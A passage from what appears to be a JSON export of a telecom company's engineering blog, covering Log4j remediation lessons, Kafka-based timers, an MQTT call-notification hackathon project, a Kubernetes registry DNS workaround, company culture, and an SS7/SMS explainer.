therefore we were not able to identify them earlier when looking just through the code dependencies. We took the necessary actions to remediate these services and investigate that there was no malicious traffic from these pods.\\n\\n### Monitoring Vendors\\n\\nIt is important to note that because we operate in the cloud and also use some vendor components in our mobile core network, we needed to ensure these core components were not affected by Log4j vulnerabilities. In our case, we followed the AWS and Cisco Security Bulletins and update our components when required.\\n\\n## What worked well and could be improved\\n\\nDuring this incident management we have gathered great learnings in the way.\\n\\nFirst of all, our GitOps and centralized software repositories have been critical to remediate very quickly to the vulnerability, enabling us to quickly deploy across our entire infrastructure new components, without interrupting operations or losing any log information in the process.\\n\\nSecond, while our monorepo and automated scan helped us a lot to identify vulnerable components, they still depend on the availability of up-to-date information. During that incident, we noticed that it was often difficult to rely on those 3rd party components to address a 0day risk. Therefore, we will rely on improving our defense-in-depth by verifying that unnecessary code execution is systematically disabled in our runtimes, improve the sanity of our container images by adopting best practices of the cloud industry.\\n\\n## Staying secure\\n\\nAll in all, it is important that we have the ability to plan, identify, contain and prevent zero-day vulnerabilities such as Log4j. We only spoke about some of the controls we have in place, but we are continuing to explore new technologies and mechanisms to ensure we build and maintain a secure environment.\\n\\n## We are hiring\\n\\nIf you are a Security Engineer looking for a new challenge to make a secure mobile core platform, come and say hi.

By design\\nwe shall assume 1 second resolution of these timers.\\n\\n\x3c!--truncate--\x3e\\n\\nBefore taking on timers let\'s cover some Kafka basics.\\n\\n## Kafka concepts\\nThere are a few Kafka concepts in play to simulate timers - Kafka topic, Kafka stream, Kafka streams library.\\nWhere *topic* is append only log of events, *stream* is a cache of N most recent events on the *topic*,\\nand the *streams library* is a software library implementing the concept of the *stream*.\\n\\nA kafka topic resides inside the Kafka servers, but Kafka streams library keeps track of a topic\'s most recent\\nevents on the application side - the stream. The stream is a key/value cache with random read access unlike\\nappend only topic log. Key/value cache is not the only thing the library provides. It can also join\\nthe streams. When an event and its key appear on a stream, the library looks up the same key in the other streams participating in the join.\\nIt is using key/value cache associated with each stream and gives the result to the application.\\nThe result will have the present event enriched with the matched past events from the joined streams.\\nJoining two streams will yield the timer callback. Let\'s see how.\\n\\n## Implementation\\nSince it is Kafka, timer expiration shall result in an event posted on a topic of user\'s choice at the right time.\\nThis event is delayed until due time by joining two streams: *oscillator* and *timer-request*. Callback\\nevent is pushed to *timer-request* topic with key equal to the expiration timestamp. Oscillator topic\\nis the clock dial counting seconds since UNIX epoch in real time. At some point it will get to the second\\nwhich is equal to the key on *timer-request* topic, and the join will come up with the callback event.\\n\\nAn excellent summary on \\"timer wheel\\" and other timer algorithms can be found in this linux kernel [thread](https://lwn.net/Articles/156329/).\\nOur implementation of timers using Kafka resembles the \\"timer wheel\\" algorithm with a bucket on each second to keep callbacks.\\n*Oscillator* topic models rotating clock dial, *timer-request* is bucketing callbacks by the expiration timestamp, and join of these two\\ncontains content of the expired bucket with all the callbacks in it.\\n\\n![](/img/blog/kafka-timers/kt.png)\\n\\nThere are two Kafka applications running together to service these topics:\\n* Oscillator\\n* Futures\\n\\n### Oscillator\\n\\nWith the resolution of 1 second oscillator keeps pushing *oscillator* topic:\\n```kotlin\\nwhile (running) {\\n    val nowSeconds = System.currentTimeMillis() / 1000L\\n    while (timestampSeconds < nowSeconds) {\\n        timestampSeconds++\\n        KafkaProducers.send(\\n            \\"oscillator\\",\\n            timestampSeconds.toString(),\\n            \\"1\\"\\n        )\\n    }\\n    Thread.sleep(200)\\n}\\n\\n```\\n\\n### Futures\\n\\nWhen requesting a timer by pushing *timer-request* topic, the user provides a callback structure\\nused to dispatch timer event:\\n\\n```\\nmessage Future {\\n    string callBackTopic = 1;\\n    string callBackKey = 2;\\n    bytes callBack = 3;\\n}\\n```\\n\\nJoining two streams on the key equal to the UNIX second will give all expired timers, and\\ntheir callback coordinates.\\n\\nFirst, setup a join with *WINDOW_SIZE* large enough to cover the longest timer duration\\n\\n```kotlin\\nval oscillator = builder.stream<String, String>(\\"oscillator\\")\\nval timerRequest = builder.stream(\\"timer-request\\", Consumed.with(Serdes.String(), FutureSerde()))\\nval timeoutEvents =\\n    oscillator.join(\\n            timerRequest,\\n            { _: String?, future: Future -> future },\\n            JoinWindows.of(WINDOW_SIZE),\\n            StreamJoined.with(\\n                    Serdes.String(),\\n                    Serdes.String(),\\n                    FutureSerde()\\n            ).withThisStoreSupplier(\\n                    Stores.persistentWindowStore(\\n                            \\"join-this-store\\",\\n                            WINDOW_SIZE.plusMinutes(30),\\n                            WINDOW_SIZE,\\n                            true\\n                    )\\n            ).withOtherStoreSupplier(\\n                    Stores.persistentWindowStore(\\n                            \\"join-other-store\\",\\n                            WINDOW_SIZE.plusMinutes(30),\\n                            WINDOW_SIZE,\\n                            true\\n                    )\\n            )\\n    )\\n```\\n\\nSecond, kick of the processing loop looking for expired timers\\n\\n```kotlin\\ntimeoutEvents.process(\\n        ProcessorSupplier {\\n            object : Processor<String, Future> {\\n                override fun init(context: ProcessorContext) {}\\n                override fun process(key: String, value: Future) {\\n                    KafkaProducers.send(Topic.valueOf(value.callBackTopic),\\n                            value.callBackKey,\\n                            value.callBack.toByteArray()\\n                    )\\n                    Metrics.timerFired(value.callBackTopic)\\n                }\\n\\n                override fun close() {}\\n            }\\n        }\\n)\\n\\n```\\n### Cancelling a timer\\nThere is no way to cancel these timers as events can\'t be easily removed from the Kafka stream.\\nStill, it is possible to ignore timer events by using a token in callback request, and a variable\\nin timer receiver state. When scheduling a timer the receiver puts the same token in two places:\\n\\n* callback struct it publishes on the *timer-request* topic\\n* internal variable timerToken\\n\\nAs timer fires receiver compares value in timerToken and in the callback event. Based on the result it\\ndraws a conclusion if timer is to be ignored or not. All it has to do to cancel a timer is to reset\\nvalue in its timerToken variable.\\n\\nSince normally Kafka does \\"at least once\\" delivery it is a good idea to reset the timerToken immediately\\nafter notification event.\\n\\n### What to worry about\\n\\nKafka streams library is using local disk storage to keep the cache. The storage shall be large enough to host\\nall timer requests based on the product of *timer-request* topic retention, callback size and timer scheduling rate.\\nThankfully Kafka is well-equipped to deal with this sort of troubles.\\n\\nOscillator must keep ticking otherwise timers will stop coming. Make sure to have\\nmetrics/alarms in place to stay on top of Oscillator health. Deploy few of them for redundancy having in\\nmind the extra load they will generate on timer users.\\n\\n## Conclusion\\n\\nThere are many options to export application state to the data tier layer. Timers are often part of that\\nstate. Above we showed how to apply Kafka primitives to achieve a goal of making application \\"stateless\\" even\\nif the state is using timers. It has its costs and benefits.\\n\\nCheck out openings on the [Careers page](/careers/) if you\u2019re interested in building the future Telco backbone."},{"id":"mqtt-event-bridge","metadata":{"permalink":"/jp/blog/mqtt-event-bridge","editUrl":"https://github.com/working-group-two/wgtwo.com/edit/main/blog/../blog/2021-01-07-mqtt-event-bridge.md","source":"@site/../blog/2021-01-07-mqtt-event-bridge.md","title":"Changing the color of your bulbs: The fancy way","description":"last hackathon i did setup a mqtt integration towards wgtwo\'s apis to enable call notifications via my ikea tr\xe5dfri bulb so i can finally notice my wife calling me. the bulb changes color when my phone is ringing and when I am in a call, without me needing to install anything to my phone.","date":"2021-01-07T00:00:00.000Z","formattedDate":"January 7, 2021","tags":[{"label":"api","permalink":"/jp/blog/tags/api"},{"label":"grpc","permalink":"/jp/blog/tags/grpc"},{"label":"mqtt","permalink":"/jp/blog/tags/mqtt"},{"label":"node-red","permalink":"/jp/blog/tags/node-red"}],"readingTime":5.54,"hasTruncateMarker":true,"authors":[{"name":"Gunnar Inge G.

This includes information such as call events, SMS sent to and from a subscription (including content), voicemail events, location events, and more.\\n\\nWe offer a [gRPC API](https://docs.wgtwo.com/events/listen-for-events/) which enables developers to listen to a selection of these events.\\n\\nI wanted to make a super simple setup so that I could configure home automation rules, e.g. **\\"If someone calls me, make my IKEA bulb change color to notify me\\"** or **\\"If I send myself a SMS with \'Leaf ON\', turn on the heater in my car\\"**.\\n\\nA lot of home automation tools, such as Node-RED and Home Assistant have great MQTT support, so instead of writing a native gRPC integration I wanted to make a more flexible solution by offering these events over MQTT. This way, anyone using a home automation tool with MQTT support can integrate with our platform easily.\\n\\nDuring our last hackathon I built a simple bridge between our events API and MQTT. I wrote this bridge in Go, using [Mochi MQTT](https://github.com/mochi-co/mqtt) as an embedded MQTT server.\\n\\nThe flow is shown in this sketch:\\n![](/img/blog/mqtt-event-bridge/sketch.svg)\\n\\nThe way it works is quite simple: You log in to the service using our OAuth solution. You then grant the service access to fetch events on your behalf. The service will then generate a username and password for you.\\n\\nThe service will fetch events for all subscribers that have enabled it and publish these to the MQTT server with topic `{phone number}/events/{type}`. With the generated credentials, you may then subscribe to these events.\\n\\nNote that nothing of this requires any setup on your phone, so it would work equally well on a 20-30 year old Nokia phone.\\n\\nAs I\'ll explain in more detail below, I did setup a quick Node-RED flow to consume these events as shown in the video below:\\n\\n## Video\\n\\n<video width=\\"100%\\" controls>\\n  <source src={require(\'../website/static/video/blog/mqtt-event-bridge/calling.mp4\').default} type=\\"video/mp4\\" />\\n  Your browser does not support the video tag.\\n</video>\\n\\nHere you can see that:\\n1. The light changes to cool white when the call is initiated (phone not yet ringing)\\n2. It turns pink when the phone is ringing\\n3. It turns red when we pick up the call\\n4. It returns to normal after the call has ended\\n\\n## Connecting to **wgtwo**\'s API\\n\\nWe will use a normal OAuth2 authorization code grant for logging in to our service.\\n\\nTo handle this, we used the module `github.com/markbates/goth` with the following settings:\\n\\n```go\\nimport \\"golang.org/x/oauth2\\"\\n\\nconst endpointProfile string = \\"https://id.wgtwo.com/userinfo\\"\\n\\nvar Endpoint = oauth2.Endpoint{\\n  AuthURL:  \\"https://id.wgtwo.com/oauth2/auth\\",\\n  TokenURL: \\"https://id.wgtwo.com/oauth2/token\\",\\n}\\n```\\n\\nWhen logging in, the user will be asked to consent to the following scopes:\\n- phone: Allowing the service to fetch the user\u2019s phone number\\n- offline_access: Giving the service a refresh token\\n- events.voice.subscribe: Allow the service to see all call events\\n- events.voicemail.subscribe: Allow the service to see if a voicemail has been left\\n- events.sms.subscribe: Allow the service to get a copy of every SMS sent and received\\n\\nAll the events you have consented to share with the service will be stored in the service\'s queue.\\n\\n```\\nsms events        \u2500\u256e\\nvoice events      \u2500\u253c\u2500\u25b7  queue  \u25c1\u2500\u2500 gRPC API\\nvoice mail events \u2500\u256f\\n```\\n\\nThis queue can be consumed by using the events streaming API ([docs](https://docs.wgtwo.com/events/listen-for-events/)), which requires the service to use the OAuth2 client credentials grant flow.\\n\\nEvents will be shared with the service as long as there exists an active consent.\\n\\nWe then initiate the server side stream to fetch the events:\\n```go\\nrequest := &pb.SubscribeEventsRequest{\\n  Type:          []pb.EventType{pb.EventType_VOICEMAIL_EVENT},\\n  StartPosition: &pb.SubscribeEventsRequest_StartAtOldestPossible{},\\n  ClientId:      uuid.New().String(),\\n  QueueName:     \\"wgtwo-mqtt-demo\\",\\n  DurableName:   \\"wgtwo-mqtt-demo\\",\\n  MaxInFlight:   10,\\n  ManualAck: &pb.ManualAckConfig{\\n     Enable:  true,\\n     Timeout: ptypes.DurationProto(10 * time.Second),\\n  },\\n}\\nr, err := c.Subscribe(context.TODO(), request)\\n\\nfor {\\n  response, err := r.Recv()\\n  if err == io.EOF || err != nil {\\n     break\\n  }\\n\\n  event := response.Event\\n  // PUBLISH EVENT TO MQTT SERVER ON TOPIC {event owner}/events/{type}\\n}\\n```\\n\\n## Connecting to our new MQTT service\\nThe service has a very pretty landing page (Disclaimer: I am not a designer).\\n\\n![landing page](/img/blog/mqtt-event-bridge/landing-page.png)\\n\\nClicking this button takes you to the login page:\\n\\n<div class=\\"post-images halves\\" markdown=\\"1\\">\\n![](/img/blog/mqtt-event-bridge/login-enter-phonenumber.png)\\n![](/img/blog/mqtt-event-bridge/login-pin.png)\\n</div>\\n\\n\u2026 and then asks you to allow our service to get your voice event and new voicemails. As I am only interested in the voice events here, I\u2019ll only grant that.\\n\\nAs this is an experimental app which hasn\u2019t been approved by anyone, our login page will give you a clear warning about trusting this.\\n\\n<div class=\\"post-images single\\" markdown=\\"1\\">\\n![](/img/blog/mqtt-event-bridge/login-consent.png)\\n</div>\\n\\nWhen that is done, it returns to our app showing this beautiful UI (still not a designer):\\n\\n![](/img/blog/mqtt-event-bridge/success.png)\\n\\nThe generated credentials will allow you to listen any topic matching `{phone number}/#`.\\n\\nThe following is the output from pasting that mosquitto_sub command in my terminal.

Looking at the output, we can see that the event object has a key `voiceEvent`, as this is a voice event.\\n\\n![](/img/blog/mqtt-event-bridge/nodered-flow.png)\\n\\nThen we added a switch for handling it as a voice event if the voiceEvent key exists. Likewise, we added a new switch on the type field of that event.\\n\\nEach of those functions simply set the Tr\xe5dfri payload, as shown below:\\n\\n```json\\n{\\"state\\":\\"on\\",\\"color\\":\\"cool daylight\\"}\\n```\\n\\nAs this was created quickly as a hackathon project, the intention was never to actually make anything useful. Using this quick flow, it is however clear that it could be very useful for when my wife tries to call me, but I am programming equipped with my noise-cancelling headphones."},{"id":"forbidden-lore-hacking-dns-routing-for-k8s","metadata":{"permalink":"/jp/blog/forbidden-lore-hacking-dns-routing-for-k8s","editUrl":"https://github.com/working-group-two/wgtwo.com/edit/main/blog/../blog/2020-12-11-forbidden-lore-hacking-dns-routing-for-k8s.md","source":"@site/../blog/2020-12-11-forbidden-lore-hacking-dns-routing-for-k8s.md","title":"Forbidden lore: hacking DNS routing for k8s","description":"At WG2 we\u2019re coming close to having everything running in Kubernetes, which means that almost everything we deploy needs to be pulled from a registry.

We have run our own local registry for some time now, to host both locally-built images and cached images from Docker Hub.\\n\\n\x3c!--truncate--\x3e\\n\\nWe recently decided to improve the registry solution by implementing [Harbor](https://goharbor.io/) to scan images for vulnerabilities on upload, and replicating the registry into each of our multiple environments and regions. This would both eliminate Harbor as a single point of failure, and allow each cluster to pull images locally to minimise data transfer costs through the NAT gateway.\\n\\nThe overall workflow would look something like:\\n\\n* images are built and uploaded to Harbor\\n* Harbor scans for vulnerabilities and pushes images to a private registry\\n* this registry is replicated to a read-only registry\\n* the read-only registry is replicated to all environments and regions\\n* the Kubernetes cluster in each environment deploys from the local read-only registry\\n\\n![Workflow](/img/blog/forbidden-lore-hacking-dns-routing-for-k8s/multiregion.jpg)\\n\\nHarbor has to live somewhere, so we decided it should live in the dev environment, close to the CI system that builds the majority of our images. However, container image names contain the registry location that they are pulled from / pushed to, eg `reg.wgtwo.com/infra/logstash`. Therefore in the dev environment we have to find a way to deal with the fact that we want users and the CI system to push to Harbor, but we also want Kubernetes to pull images from the read-only registry.\\n\\nSo the main problem becomes: if the image name includes the url `reg.wgtwo.com`, how to make that point to two different places depending on usage?\\n\\n# Solution 1: DNS\\n\\nIn non-dev environments, the obvious solution is to redirect `reg.wgtwo.com -> read-only-registry` in Kubernetes CoreDNS. But in dev, we need different services to go to different places. The DNS model thus needs to look like:\\n\\n![DNS](/img/blog/forbidden-lore-hacking-dns-routing-for-k8s/dnsresolution.jpg)\\n\\nIn other words,\\n\\n* ``Route53`` sets `reg.wgtwo.com -> harbor`\\n* K8s coreDNS sets `reg.wgtwo.com -> read-only-registry`\\n* CI (Concourse) bypasses cluster lookup and goes to ``Route53`` instead, such that `reg.wgtwo.com -> harbor`\\n\\nWe initially deployed a DNS sidecar to the CI system, but with multiple Concourse pods we got multiple sidecars and we really only needed one, plus we had to manipulate Concourse\u2019s internal DNS cache (`CONCOURSE_GARDEN_DNS_SERVER`) but that broke DNS between Concourse and everything else in the cluster. Replacing the sidecar with a DNS pod in the CI namespace worked better, although then all the CI jobs needed to be updated to use that new pod as their nameserver.\\n\\n![Sleight of hand](/img/blog/forbidden-lore-hacking-dns-routing-for-k8s/sleight-of-hand.gif)\\n\\nHowever at this point we realised that although we want to deploy pods into Kubernetes, the process that does the deploying lives on the Kubernetes nodes, outside of cluster scope.\\nWe don\u2019t do any config management on the nodes, we just let [kOps](https://github.com/kubernetes/kops) deploy everything that Kubernetes needs for a cluster, so we were reluctant to introduce an entirely different system just for managing one `resolv.conf` file. Also the concentric DNS setup would have a very wide scope and be somewhat difficult to debug. Maybe this was a problem better resolved using some clever nginx routing?\\n\\n# Solution 2: nginx\\n\\nIf we could find some way of differentiating the Harbor traffic from read-only-registry traffic, we could let nginx route requests to the right place.\\n<iframe src=\\"https://giphy.com/embed/QaPkV29BJh3gI\\" width=\\"240\\" height=\\"177\\" frameBorder=\\"0\\" class=\\"giphy-embed\\" allowFullScreen></iframe>\\n\\n\\n# Solution 2a: nginx routes traffic on IP\\n\\n* Traffic from the outside world plus traffic from Concourse needs to go to Harbor.\\n* Traffic from the Kubernetes cluster needs to go to the read-only-registry.\\n\\nThe [nginx geo module](https://nginx.org/en/docs/http/ngx_http_geo_module.html) sounded like a good idea, where we could set our internal subnet ranges to go to the read-only-registry. However getting the ingress annotations to put this config in the right place turned out to be challenging, since it needs to go outside of both `http snippet` and `server snippet` blocks. But before we dug further into this issue we realised that all of the traffic to nginx would arrive via the internet gateway, meaning we wouldn\u2019t see source IP anyway.\\n\\n# Solution 2b: nginx routes on custom header\\n\\nThe new `canary` feature in nginx makes this kind of routing very easy - traffic that matches a certain criteria gets sent to a different backend. We could use a custom header such as `ro-reg` to send internal traffic to the read-only registry.\\n\\n    annotations:\\n      nginx.ingress.kubernetes.io/canary: \\"true\\"\\n      nginx.ingress.kubernetes.io/canary-by-header: \\"ro-reg\\"\\n\\nThe docker (client) config has an [HttpHeaders](https://github.com/docker/cli/blob/master/man/docker-config-json.5.md) section, so it would be easy enough to add this section to all of our image-pull secrets, meaning all internal pulls - but nothing else - should go to the read-only registry.\\n\\nWe had to rearrange things a little in order to terminate SSL on nginx and not at the registry so that nginx would be able to read the headers, but that was straightforward.\\n\\nIn our initial tests from the laptop, this worked great. However it quickly transpired that this was the only place it worked from. Where we needed it to work from - the Kubernetes nodes - didn\u2019t run Docker, they run ``docker-shim`` on top of ``containerd``, and ``HttpHeaders`` [are not implemented yet](https://github.com/containerd/cri/issues/1400). Back to the drawing board.\\n\\n# Solution 2c: nginx routes on auth header\\n\\nGetting nervous that we\u2019d used a week to get nothing working, we started clutching at some very hacky straws. Even if docker-shim doesn\u2019t send custom headers, we could see it sending auth headers, and we have different login details for Harbor versus the read-only registry. We wondered if we could route on the auth hash, postponing entirely the discussion about whether we should do such a horrible thing, or the security implications of having the auth hash in a plaintext nginx config.\\n<iframe src=\\"https://giphy.com/embed/I8RMi1UY8cEKs\\"  frameBorder=\\"20px\\" class=\\"giphy-embed\\" allowFullScreen></iframe>\\n\\n\\nWe soon discovered that this solution was also never going to work. In Kubernetes, it is the ``kubelet`` process that does the image pull at the start of a pod deployment, and after some wiresharking it turns out that the very first thing kubelet does is make an unauthenticated call to the `registry/v2` endpoint to fetch metadata which it then uses to begin authentication.\\n\\nThis is expected behaviour for a docker registry, [according to documentation](https://docs.docker.com/registry/spec/auth/token/), but with nginx routing on auth header, it meant that the initial call was routed to Harbor which sent back an auth URL also for Harbor, and thus kubelet never even arrived at the read-only registry, let alone managed to authenticate.\\n\\n# Aside: other issues with headers\\n\\nDuring this debugging session we also realised that we\u2019d been creating image-pull secrets in Kubernetes with both `.dockercfg` and `.dockerconfigjson`, not realising that `.dockercfg` [is the old format](https://github.com/moby/moby/pull/12009) and that `.dockercfg` likely does not support HttpHeaders at all.\\n\\nKubelet [does support HttpHeaders](https://github.com/Kubernetes/Kubernetes/blob/e1fd2d7ff57af153023347d72d17226effd917c8/pkg/credentialprovider/config.go#L44), but relies on the underlying container runtime to also support them - which is not the case for containerd.\\n\\nAdditionally, when creating a Kubernetes secret containing `.dockerconfigjson`, it appears that it is very important that there is no whitespace in the secret, or authentication will fail.\\n\\n# Solution 2d: route on some other inherent header\\n\\nAs one final attempt at making nginx routing work, we looked for other headers being sent, but there was no single header that let us differentiate between kubelet, laptop, and Concourse.\\n\\nKubelet sends a useragent of either `docker` or `go-http-agent` (depending on whether the call is the initial one or a retrial) and filtering on `go-http-agent` also catches Concourse requests, rendering it useless for this task. We were also worried it might end up catching all sorts of unintended cases since we have quite a lot of `go`-based applications in our ecosystem.\\n\\nWe took a moment to mourn the loss of our nginx idea, and went back to a DNS solution.\\n\\n![Mourn](/img/blog/forbidden-lore-hacking-dns-routing-for-k8s/pulpfiction.jpg)\\n\\n# Solution 3: DNS, again\\n\\nWe put the DNS solution back in place again, where\\n\\n* ``Route53`` sets `reg.wgtwo.com -> harbor`\\n* K8s nodes set `reg.wgtwo.com -> read-only-registry`\\n* K8s coreDNS sets `reg.wgtwo.com -> read-only-registry`\\n* CI runs an additional coreDNS pod setting `reg.wgtwo.com -> harbor`\\n* Concourse uses CI coreDNS pod to set `reg.wgtwo.com -> harbor`\\n\\nWhich brought us back to the problem that was still there: how to update `/etc/resolv.conf` on the nodes. In the continued absence of config management, we hit upon the wonderful hack of using a privileged pod daemonset to manage the config for us via systemd.\\n\\nThe privileged pod on each node would write a new config file to `/etc/systemd/resolvd.conf`, and then restart the systemd service to update the running resolvd process.\\n\\nThis would thus control configuration on the Kubernetes node from inside of Kubernetes, which is admittedly morally wrong but also works really well. It also keeps the configuration alongside all the rest of our configuration instead of hidden away somewhere new.\\n\\n![wheel change](/img/blog/forbidden-lore-hacking-dns-routing-for-k8s/wheelchange.gif)\\n\\nA future solution might be to implement some kind of local DNS server/cache on each node, but for now we\u2019ll settle for a working system and a huge increase in knowledge about the inner workings of many of our components."},{"id":"were-all-grownups-here","metadata":{"permalink":"/jp/blog/were-all-grownups-here","editUrl":"https://github.com/working-group-two/wgtwo.com/edit/main/blog/../blog/2020-11-20-were-all-grownups-here.md","source":"@site/../blog/2020-11-20-were-all-grownups-here.md","title":"We\'re all grownups here","description":"I have always struggled with company HR policies that make me not feel trusted.

If you are given freedom it comes with a lot of responsibility, isn\u2019t that rather implicit?\\n\\n\x3c!--truncate--\x3e\\n\\nIt comes down to a choice - minimize risk by implementing all possible controls, or trust people and implement necessary controls only. We believe the latter drives ownership, motivation and a better product and company. That doesn\u2019t mean it is easy though - the need to control is a fundamental human need, and we need daily reminders to always push in the opposite direction.\\n\\nWhen I was in discussions with Erlend (our CEO) about joining **wgtwo**, the term \u201cstartup for grownups\u201d was used and I remember thinking \u201chuh, that makes sense\u201d. Now, 2 years in, the simple fact that yes we are all grownups here and we all deserve to be treated as such has become an embedded part of our company culture.\\n\\nI wanted to give you some tangible examples of how we do things. For context, we are a startup tech company with a team of ~50 (87% engineers). We have offices in Oslo, Trondheim, Stockholm, a hub in Germany and remote team members in Japan, Spain, the U.S., Canada, London and Myanmar.\\n\\n## What approvals?\\n\\nWe try to minimize that amount of approvals necessary to a minimum. Here is how we communicate that to new hires in some of the areas companies typically have approvals\\n* Vacation: Yes, we do have the standard 25 days of vacation (standard in the Nordics) in our contracts. But, we also trust you to know yourself best, and understand that no year or situation is the same. Sometimes you might need more, sometimes less. As long as it works for your team, we trust you to make a judgement. We also trust that you take enough time off as we all need time off to reset and recharge.\\n* Expenses: We trust your judgement and that you wouldn\u2019t be making the purchase if it wasn\u2019t necessary for you and the team. This applies when deciding on which equipment (i.e. laptop, monitor, keyboard, phone etc) you need when you start and later if there is something you need. I have yet to experience anyone asking for anything totally unreasonable. Of course you are welcome to reach out if you are unsure and from time to time we might have discussions, but surprisingly seldom to be honest.\\n* Travel: We encourage you to travel between offices to build a strong relationship with the whole team (unfortunately not now of course with the covid-19 going on). You do not need approval to book travel, and remember you don\u2019t need a \u201creason\u201d to go.\\n* Working hours: As long as you do a good job we don\u2019t care if you work half days Mondays or start working at lunch time and into the evening, go to the gym and so on. Up to you, as long as it works for your team. Not to mention where you work from. Office, home, cabin, boat - who cares as long as you are connected right?\\n\\nThese aren\u2019t necessarily big things in everyday life, but they take out administrative hassle, and it aligns with the messaging of that we try to trust each other.\\n\\n## Are you a role model?\\n\\nThis lack of approvals does create another need though - the need for role models. So we do remind the team to keep in mind that we are role models for each other. It provides alignment. Whether it\u2019s sharing with the others that the train ticket prices are currently low and recommend people to book now to save money, or taking initiative to set up a virtual social Friday get-together to end the week together. We even have our own role model emoji in slack, which we sometimes remember to use and I do believe people feel proud if they get one.\\n![Decorative illustration](/img/blog/were-all-grownups-here/04.png)\\n\\n## Sharing is caring\\n\\nThat we see each other as grownups is also evident in how we communicate and what information we trust each other with. If there is one thing the team mentions to me that has surprised them the most after joining, it is the amount of information that is shared across the team about sales, customer meetings and other business processes. The good and the bad. When I had a \u201c6 months in\u201d check-in with one of our newest team members he emphasized exactly this and explained how this made him feel involved and prepared for what was coming. It is also evident when people choose to share that they are struggling with the likes of depression or something else often considered very private. Or just putting up your hand and saying \u201cI broke something\u201d and taking responsibility for that. I believe this level of sharing is possible because we trust each other and have each other\'s backs and management leads the way when it comes to sharing.\\n\\n## Direction\\n\\nTo clarify. We do of course need to make sure we move the company in the right direction together. We have chosen to use OKRs (Objectives and Key Results) as a tool for that. A tool that helps us discuss and decide together as a team what we want to achieve, but without dictating the how. This is a delicate balance, and we always have to fight to not create too detailed OKRs. The teams and individuals should feel empowered when understanding and agreeing on the why and what, but are allowed to determine the how.\\n![Decorative illustration](/img/blog/were-all-grownups-here/03.png)\\n\\n## Stay open to change\\n\\nSo do we have improvement areas? Of course! One example is that I believe we can be better at living one of our values which is \u201cTough Love\u201d. This relates to among other things how we give feedback. I wouldn\u2019t say we are bad at it, but our inclination is often towards being a bit too soft, which sometimes leads to unclear feedback or neglecting giving feedback. So we need to keep practicing to make sure we challenge and develop each other as much as we can. And I\u2019m sure it\u2019s a bunch of other stuff. We are still a young company and open to change - we try out stuff and sometimes fail. We keep on learning and making small tweaks all the time to adjust to our team. Just this morning I listened to an inspiring 5 min talk from Lucy Adams about probation periods and realized that we have those in our contracts -  yikes that doesn\u2019t exactly scream that we trust who we recruit does it? I will look into that asap\u2026\\n\\nSo, we are all grownups here. At least most of the time. Although maybe not when the Trondheim team bought naughty chocolates and expensed it to see if anyone would notice (we didn\u2019t)."},{"id":"hackdays-october-2020","metadata":{"permalink":"/jp/blog/hackdays-october-2020","editUrl":"https://github.com/working-group-two/wgtwo.com/edit/main/blog/../blog/2020-10-28-hackdays.md","source":"@site/../blog/2020-10-28-hackdays.md","title":"October Virtual Hackdays","description":"this week we started off with a three days hackathon!","date":"2020-10-28T00:00:00.000Z","formattedDate":"October 28, 2020","tags":[{"label":"hackathon","permalink":"/jp/blog/tags/hackathon"}],"readingTime":1.705,"hasTruncateMarker":true,"authors":[{"name":"Everyone @ wgtwo","title":"\ud83c\udf55","url":"https://www.wgtwo.com","imageURL":"/img/author-photos/wgtwo.png","key":"wgtwo"}],"frontMatter":{"slug":"hackdays-october-2020","title":"October Virtual Hackdays","date":"2020-10-28T00:00:00.000Z","tags":["hackathon"],"authors":"wgtwo","image":"/img/blog/hackdays-october-2020/presentations.png"},"prevItem":{"title":"We\'re all grownups here","permalink":"/jp/blog/were-all-grownups-here"},"nextItem":{"title":"What the heck is a short message?","permalink":"/jp/blog/what-is-a-short-message"}},"content":"this week we started off with a three days hackathon!\\n\\nEvery quarter **wgtwo** holds a three day hackday.

It is supposed to be\\nquicker than *TCP*, but more reliable than *UDP*.\\n\\nBoth *M2PA* and *M3UA* support *SCTP* management, and the reporting of\\nstatus changes of those, as well as providing transfer of *MTP3*\\n(Message Transfer Part 3) messages.\\n\\nOn top of *SIGTRAN* are the *SS7* protocols.\\n\\nWhat I\'m going to talk about are the protocols on the very top of *SS7*,\\nspecifically the *MAP* (Mobile Application Part) as well as the *TCAP*\\n(Transaction Capabilities Application Part). There are other protocols\\ninbetween, for instance *SCCP* (Signalling Connection Control Part)\\nwhich handles some handshaking, routing, and resilience.\\n\\nThe *MAP* layer is used when talking to some of the telco nodes such\\nas *HLR* (Home location registry), *VLR* (Visitor location registry),\\n*MSC* (Mobile switching centre), *SGSN* (Serving *GPRS* [ackronym in\\nackronyms; go telco!] support node) and the *SMSC* (Short message\\nservice centre).\\n\\n# MAP versions and TCAP dialogues\\n\\nThere are some iterations of *MAP* (v1, v2, v3, and v4) and messages\\nalmost always come in pairs, an acknowledgement (`ReturnResult` or\\n`ReturnError`) for each sent message (`Invoke`).\\n\\nTo determine which version to use between two nodes, the sending node\\ntries to start the transaction (called a dialogue) by sending a *TCAP*\\n`Begin` message with the *MAP* message and it\'s highest compatible\\nversion. If the receiving node cannot talk that version, it sends a\\n*TCAP* `Abort` message with it\'s highest compatible version. In v1\\nthere might not even be a reason, just an empty `Abort`; the sending\\nnode might then try to send the *MAP* message as v1 anyway.\\n\\nIn my head it goes like this:\\n\\n```\\nNode 1: \\"Hi, I want to talk version 3 to you about this\\"\\nNode 2: \\"No I don\'t understand you, but we can talk version 2 about it instead\\"\\nNode 1: \\"Ok, then I want to talk version 2 to you about this instead\\"\\nNode 2: \\"Aah, now I see...\\"\\n```\\n\\nOr maybe\\n\\n```\\nNode 1: \\"Hi, I want to talk version 3 to you about this\\"\\nNode 2: \\"No\\"\\nNode 1: \\"Ok, then I want to talk to you about this in version 1 instead\\"\\nNode 2: \\"Maybe I will talk to you, maybe I will not\\"\\n```\\n\\nFor *TCAP* dialogues there are (mainly) four message types.  `Begin`,\\n`Continue`, `End`, `Abort`. Each of the types have an ID (or two, as I\\nsaid, telco is complicated), a component and a dialogue part. The\\ncomponent contains the *MAP* message. The dialogue part contains\\nthe version and application to use (that is *MAP* Application;\\ni.e. which type of message it contains), but it is only used in the\\nfirst message from both nodes for the version negotiation.\\n\\n_I think this covers most of it, let\'s get back to the fun part._\\n\\n# How does SMS work?\\n\\n*SMS* was initally implemented because of the wish to send text\\nmessages to pagers using the phoneline when it was not in use for\\nphonecalls. It was decided at a meeting in Oslo to be released to the\\npublic when some French and German company understood it\'s\\nvalue. (Don\'t quote me on any of this).\\n\\nWhen you send an *SMS*, the *SMS* is transfered to the *MSC* or the\\n*SGSN* in your current (serving) network. The *MSC* or *SGSN* then\\nsends an packet called 